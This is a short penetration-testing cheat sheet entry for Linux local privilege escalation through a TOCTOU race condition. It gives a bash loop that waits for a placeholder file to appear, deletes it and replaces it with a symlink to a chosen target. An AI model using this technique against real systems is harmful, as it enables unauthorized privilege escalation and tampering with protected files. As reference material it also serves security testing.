# race condition

% toctou, race condition
#platform/linux #target/local #cat/PRIVESC 

## change a file by a symlink when found
```bash
while true ; do N=<file_to_search> ; if [[ -r $N ]] ; then rm $N ; ln -s <symlink_target_file> $N ; break; fi ; done
```
